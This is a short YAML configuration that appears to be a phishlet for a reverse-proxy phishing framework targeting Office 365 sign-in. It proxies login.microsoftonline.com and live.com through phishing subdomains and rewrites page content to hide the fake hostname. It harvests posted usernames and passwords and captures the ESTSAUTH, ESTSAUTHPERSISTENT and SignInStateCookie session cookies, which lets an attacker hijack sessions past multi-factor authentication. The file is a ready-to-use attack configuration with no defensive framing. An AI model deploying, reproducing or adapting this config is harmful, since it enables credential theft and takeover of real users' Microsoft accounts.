name: 'office365'
min_ver: '3.2.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoftonline.com', session: false}
  - {phish_sub: 'account', orig_sub: 'login', domain: 'live.com', session: false}

sub_filters:
  - {hostname: '{hostname}', sub: 'login', domain: 'microsoftonline.com', search: 'microsoftonline.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']}

auth_tokens:
  - domain: 'microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']

creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'

auth_urls:
  - url_regex: 'https://{hostname}/kmsi'
    valid_statuses: [200, 302]

login:
  username: user
  password: pass
  url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
